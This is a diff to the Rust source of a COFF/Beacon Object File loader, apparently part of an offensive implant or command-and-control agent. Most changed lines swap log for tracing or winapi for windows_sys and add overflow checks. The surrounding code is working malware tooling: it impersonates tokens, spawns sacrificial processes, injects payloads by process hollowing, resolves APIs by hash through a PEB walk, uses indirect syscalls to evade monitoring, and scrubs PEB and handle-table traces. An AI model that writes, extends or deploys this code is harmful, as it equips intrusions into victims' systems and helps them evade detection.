@@ -44,10 +44,9 @@ use std::sync::atomic::{AtomicPtr, AtomicUsize, Ordering};
 // VirtualAlloc/VirtualFree/VirtualProtect removed — using Nt* indirect syscalls
 // CreateThread/WaitForSingleObject removed — using NtCreateThreadEx/NtWaitForSingleObject indirect syscalls
 // CreateEventW removed — was unused
-use winapi::um::winnt::{
-    MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READONLY, PAGE_READWRITE,
-};
-
+use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READ};
+use crate::win_types::PAGE_READWRITE;
+use windows_sys::Win32::System::Memory::PAGE_READONLY;
 // ── Constants ────────────────────────────────────────────────────────────────
 
 /// Maximum BOF size (1 MB).
@@ -171,13 +170,24 @@ unsafe fn append_output(data: &[u8]) {
     let needed = match len.checked_add(data.len()) {
         Some(v) => v,
         None => {
-            log::warn!("[coff_loader] append_output overflow, dropping output chunk");
+            tracing::warn!("[coff_loader] append_output overflow, dropping output chunk");
             return;
         }
     };
 
     if needed > cap {
-        let new_cap = (needed * 2).max(4096);
+        // HIGH-003: use checked arithmetic to prevent capacity overflow.
+        let doubled = match needed.checked_mul(2) {
+            Some(v) => v,
+            None => {
+                tracing::warn!(
+                    "[coff_loader] append_output capacity overflow (needed={}), dropping output chunk",
+                    needed
+                );
+                return;
+            }
+        };
+        let new_cap = doubled.max(4096);
         let new_layout = std::alloc::Layout::from_size_align(new_cap, 8).unwrap();
         let old_ptr = OUTPUT_BUFFER.load(Ordering::SeqCst);
         let new_ptr = if old_ptr.is_null() {
@@ -325,7 +335,7 @@ unsafe fn expand_format(fmt: *const i8, args: &[u64]) -> Vec<u8> {
     }
     let fmt_str = std::ffi::CStr::from_ptr(fmt);
     let fmt_bytes = fmt_str.to_bytes();
-    let mut output = Vec::with_capacity(fmt_bytes.len() * 2);
+    let mut output = Vec::with_capacity(fmt_bytes.len().saturating_mul(2));
     let mut arg_idx = 0usize;
     let mut i = 0;
     while i < fmt_bytes.len() {
@@ -592,7 +602,7 @@ unsafe extern "C" fn beacon_output(_typ: i32, data: *mut u8, len: i32) {
 /// and applies the supplied token handle to the current thread.
 unsafe extern "C" fn beacon_use_token(token_handle: *mut c_void) -> i32 {
     if token_handle.is_null() {
-        log::warn!("[coff_loader] BeaconUseToken: null token handle");
+        tracing::warn!("[coff_loader] BeaconUseToken: null token handle");
         return -1;
     }
     // Resolve ImpersonateLoggedOnUser from advapi32 via PEB-walk.
@@ -600,7 +610,7 @@ unsafe extern "C" fn beacon_use_token(token_handle: *mut c_void) -> i32 {
         match pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"advapi32.dll\0")) {
             Some(h) => h,
             None => {
-                log::warn!("[coff_loader] BeaconUseToken: failed to resolve advapi32.dll");
+                tracing::warn!("[coff_loader] BeaconUseToken: failed to resolve advapi32.dll");
                 return -1;
             }
         };
@@ -610,7 +620,7 @@ unsafe extern "C" fn beacon_use_token(token_handle: *mut c_void) -> i32 {
     ) {
         Some(a) => a,
         None => {
-            log::warn!("[coff_loader] BeaconUseToken: failed to resolve ImpersonateLoggedOnUser");
+            tracing::warn!("[coff_loader] BeaconUseToken: failed to resolve ImpersonateLoggedOnUser");
             return -1;
         }
     };
@@ -618,7 +628,7 @@ unsafe extern "C" fn beacon_use_token(token_handle: *mut c_void) -> i32 {
     let impersonate: FnImpersonateLoggedOnUser = std::mem::transmute(func_addr);
     let ok = impersonate(token_handle);
     if ok == 0 {
-        log::warn!("[coff_loader] BeaconUseToken: ImpersonateLoggedOnUser failed");
+        tracing::warn!("[coff_loader] BeaconUseToken: ImpersonateLoggedOnUser failed");
         return -1;
     }
     0
@@ -629,7 +639,7 @@ unsafe extern "C" fn beacon_revert_token() -> i32 {
     match crate::token_manipulation::rev2self() {
         Ok(_) => 0,
         Err(e) => {
-            log::warn!("[coff_loader] BeaconRevertToken failed: {e}");
+            tracing::warn!("[coff_loader] BeaconRevertToken failed: {e}");
             -1
         }
     }
@@ -670,7 +680,7 @@ unsafe extern "C" fn beacon_spawn_temporary_process(
     let k32 = match pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"kernel32.dll\0")) {
         Some(h) => h,
         None => {
-            log::warn!("[coff_loader] BeaconSpawnTemporaryProcess: kernel32 not found");
+            tracing::warn!("[coff_loader] BeaconSpawnTemporaryProcess: kernel32 not found");
             return -1;
         }
     };
@@ -680,7 +690,7 @@ unsafe extern "C" fn beacon_spawn_temporary_process(
     ) {
         Some(a) => a,
         None => {
-            log::warn!("[coff_loader] BeaconSpawnTemporaryProcess: CreateProcessW not found");
+            tracing::warn!("[coff_loader] BeaconSpawnTemporaryProcess: CreateProcessW not found");
             return -1;
         }
     };
@@ -713,7 +723,7 @@ unsafe extern "C" fn beacon_spawn_temporary_process(
     // STARTUPINFOW = 104 bytes, PROCESS_INFORMATION = 24 bytes.
     // Both zero-initialised.
     let mut startup_info = [0u8; 104];
-    let si_cb = std::mem::size_of::<winapi::um::processthreadsapi::STARTUPINFOW>() as u32;
+    let si_cb = std::mem::size_of::<crate::win_types::STARTUPINFOW>() as u32;
     startup_info[0..4].copy_from_slice(&si_cb.to_ne_bytes());
     let mut proc_info = [0u8; 24]; // hProcess(8) + hThread(8) + dwProcessId(4) + dwThreadId(4)
 
@@ -733,7 +743,7 @@ unsafe extern "C" fn beacon_spawn_temporary_process(
     );
 
     if ok == 0 {
-        log::warn!("[coff_loader] BeaconSpawnTemporaryProcess: CreateProcessW failed");
+        tracing::warn!("[coff_loader] BeaconSpawnTemporaryProcess: CreateProcessW failed");
         return -1;
     }
 
@@ -768,20 +778,20 @@ unsafe extern "C" fn beacon_inject_process(
     p_offset: i32,
 ) -> i32 {
     if payload.is_null() || p_len <= 0 {
-        log::warn!("[coff_loader] BeaconInjectProcess: null payload or invalid length");
+        tracing::warn!("[coff_loader] BeaconInjectProcess: null payload or invalid length");
         return -1;
     }
     let offset = if p_offset < 0 { 0 } else { p_offset as usize };
     let len = p_len as usize;
     if offset >= len {
-        log::warn!("[coff_loader] BeaconInjectProcess: offset >= length");
+        tracing::warn!("[coff_loader] BeaconInjectProcess: offset >= length");
         return -1;
     }
     let data = std::slice::from_raw_parts(payload.add(offset), len - offset);
     match hollowing::inject_into_process(pid as u32, data) {
         Ok(_) => 0,
         Err(e) => {
-            log::warn!("[coff_loader] BeaconInjectProcess failed: {e}");
+            tracing::warn!("[coff_loader] BeaconInjectProcess failed: {e}");
             -1
         }
     }
@@ -801,7 +811,7 @@ unsafe extern "C" fn beacon_inject_temporary_process(
     p_offset: i32,
 ) -> i32 {
     if payload.is_null() || p_len <= 0 {
-        log::warn!("[coff_loader] BeaconInjectTemporaryProcess: null payload or invalid length");
+        tracing::warn!("[coff_loader] BeaconInjectTemporaryProcess: null payload or invalid length");
         return -1;
     }
 
@@ -811,7 +821,7 @@ unsafe extern "C" fn beacon_inject_temporary_process(
     } else {
         let stored = SACRIFICIAL_PID.load(Ordering::SeqCst);
         if stored == 0 {
-            log::warn!("[coff_loader] BeaconInjectTemporaryProcess: no sacrificial process");
+            tracing::warn!("[coff_loader] BeaconInjectTemporaryProcess: no sacrificial process");
             return -1;
         }
         stored
@@ -823,14 +833,14 @@ unsafe extern "C" fn beacon_inject_temporary_process(
     let offset = if p_offset < 0 { 0 } else { p_offset as usize };
     let len = p_len as usize;
     if offset >= len {
-        log::warn!("[coff_loader] BeaconInjectTemporaryProcess: offset >= length");
+        tracing::warn!("[coff_loader] BeaconInjectTemporaryProcess: offset >= length");
         return -1;
     }
     let data = std::slice::from_raw_parts(payload.add(offset), len - offset);
     match hollowing::inject_into_process(target_pid, data) {
         Ok(_) => 0,
         Err(e) => {
-            log::warn!("[coff_loader] BeaconInjectTemporaryProcess failed: {e}");
+            tracing::warn!("[coff_loader] BeaconInjectTemporaryProcess failed: {e}");
             -1
         }
     }
@@ -1080,7 +1090,7 @@ unsafe fn resolve_dynamic_symbol(name: &str) -> Option<*const c_void> {
                 match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) {
                     Some(b) => b,
                     None => {
-                        log::warn!("[coff_loader] cannot resolve kernel32");
+                        tracing::warn!("[coff_loader] cannot resolve kernel32");
                         return None;
                     }
                 };
@@ -1090,7 +1100,7 @@ unsafe fn resolve_dynamic_symbol(name: &str) -> Option<*const c_void> {
             ) {
                 Some(a) => a,
                 None => {
-                    log::warn!("[coff_loader] cannot resolve LoadLibraryW");
+                    tracing::warn!("[coff_loader] cannot resolve LoadLibraryW");
                     return None;
                 }
             };
@@ -1098,7 +1108,7 @@ unsafe fn resolve_dynamic_symbol(name: &str) -> Option<*const c_void> {
                 std::mem::transmute(llw_addr);
             let mod_handle = load_library_w(dll_name_wide.as_ptr());
             if mod_handle.is_null() {
-                log::warn!("[coff_loader] LoadLibraryW('{}') failed", dll_name);
+                tracing::warn!("[coff_loader] LoadLibraryW('{}') failed", dll_name);
                 return None;
             }
             mod_handle
@@ -1113,7 +1123,7 @@ unsafe fn resolve_dynamic_symbol(name: &str) -> Option<*const c_void> {
     ) {
         Some(addr) => addr as *const c_void,
         None => {
-            log::warn!(
+            tracing::warn!(
                 "[coff_loader] cannot resolve '{}' in '{}'",
                 func_name,
                 dll_name
@@ -1122,7 +1132,7 @@ unsafe fn resolve_dynamic_symbol(name: &str) -> Option<*const c_void> {
         }
     };
 
-    log::debug!("[coff_loader] resolved {} at {:#x}", name, proc as usize);
+    tracing::debug!("[coff_loader] resolved {} at {:#x}", name, proc as usize);
     Some(proc)
 }
 
@@ -1250,7 +1260,7 @@ pub unsafe fn execute_bof(
     }
     let _is_amd64 = header.machine == IMAGE_FILE_MACHINE_AMD64;
 
-    log::info!(
+    tracing::info!(
         "[coff_loader] COFF: machine={:#06X} sections={} symbols={}",
         header.machine,
         header.number_of_sections,
@@ -1329,7 +1339,7 @@ pub unsafe fn execute_bof(
         return Err("COFF has no sections to load".to_string());
     }
 
-    log::info!(
+    tracing::info!(
         "[coff_loader] total memory required: {} bytes across {} sections",
         total_size,
         sections.len()
@@ -1352,7 +1362,7 @@ pub unsafe fn execute_bof(
         return Err("NtAllocateVirtualMemory failed for COFF memory".to_string());
     }
     let base = base_ptr as *mut c_void;
-    log::info!(
+    tracing::info!(
         "[coff_loader] allocated COFF memory at {:#x}",
         base as usize
     );
@@ -1388,7 +1398,7 @@ pub unsafe fn execute_bof(
                 std::ptr::read_unaligned(coff_bytes.as_ptr().add(roff) as *const CoffRelocation);
             let sym_idx = reloc.symbol_table_index as usize;
             if sym_idx >= symbols.len() {
-                log::warn!(
+                tracing::warn!(
                     "[coff_loader] relocation references invalid symbol index {}",
                     sym_idx
                 );
@@ -1404,7 +1414,7 @@ pub unsafe fn execute_bof(
                 if sec_idx < sections.len() {
                     base as usize + section_offsets[sec_idx] + symbol.value as usize
                 } else {
-                    log::warn!(
+                    tracing::warn!(
                         "[coff_loader] symbol '{}' references invalid section {}",
                         sym_name,
                         symbol.section_number
@@ -1416,7 +1426,7 @@ pub unsafe fn execute_bof(
                 match resolve_symbol(&sym_name, &internal_symbols) {
                     Some(addr) => addr as usize,
                     None => {
-                        log::warn!("[coff_loader] unresolved external symbol: '{}'", sym_name);
+                        tracing::warn!("[coff_loader] unresolved external symbol: '{}'", sym_name);
                         continue;
                     }
                 }
@@ -1441,7 +1451,7 @@ pub unsafe fn execute_bof(
                 _ => 0,
             };
             if write_size == 0 {
-                log::warn!(
+                tracing::warn!(
                     "[coff_loader] unsupported relocation type {} for symbol '{}' at offset {:#x}",
                     reloc_type,
                     sym_name,
@@ -1463,7 +1473,7 @@ pub unsafe fn execute_bof(
                 }
                 IMAGE_REL_AMD64_ADDR32NB => {
                     if sym_addr > 0xFFFFFFFF {
-                        log::warn!(
+                        tracing::warn!(
                             "[coff_loader] ADDR32NB relocation truncates 64-bit address {:#x}",
                             sym_addr
                         );
@@ -1571,13 +1581,13 @@ pub unsafe fn execute_bof(
         );
         match flush_status {
             Ok(s) if s < 0 => {
-                log::warn!(
+                tracing::warn!(
                     "coff_loader: NtFlushInstructionCache returned 0x{:08X} (non-fatal on x64)",
                     s as u32
                 );
             }
             Err(_) => {
-                log::debug!("coff_loader: NtFlushInstructionCache syscall not available");
+                tracing::debug!("coff_loader: NtFlushInstructionCache syscall not available");
             }
             _ => {} // success (status >= 0)
         }
@@ -1596,7 +1606,7 @@ pub unsafe fn execute_bof(
             if sec_idx < sections.len() {
                 let addr = base as usize + section_offsets[sec_idx] + symbol.value as usize;
                 go_addr = Some(addr);
-                log::info!(
+                tracing::info!(
                     "[coff_loader] found 'go' entry point at {:#x} (section {}, offset {:#x})",
                     addr,
                     sec_idx,
@@ -1720,9 +1730,9 @@ pub unsafe fn execute_bof(
     let timed_out = wait_status.is_err() || wait_status.unwrap() != 0;
 
     if timed_out {
-        log::warn!("[coff_loader] BOF timed out after {}s", timeout);
+        tracing::warn!("[coff_loader] BOF timed out after {}s", timeout);
         // TerminateThread is dangerous but necessary for timeout.
-        winapi::um::processthreadsapi::TerminateThread(thread_handle, 1);
+        windows_sys::Win32::System::Threading::TerminateThread(thread_handle as *mut _, 1);
     }
 
     // ── Collect output ──────────────────────────────────────────────────
@@ -1767,7 +1777,7 @@ pub unsafe fn execute_bof(
     crate::memory_hygiene::scrub_peb_traces();
     crate::memory_hygiene::scrub_handle_table();
 
-    log::info!(
+    tracing::info!(
         "[coff_loader] BOF execution complete, {} bytes output",
         output_bytes.len()
     );
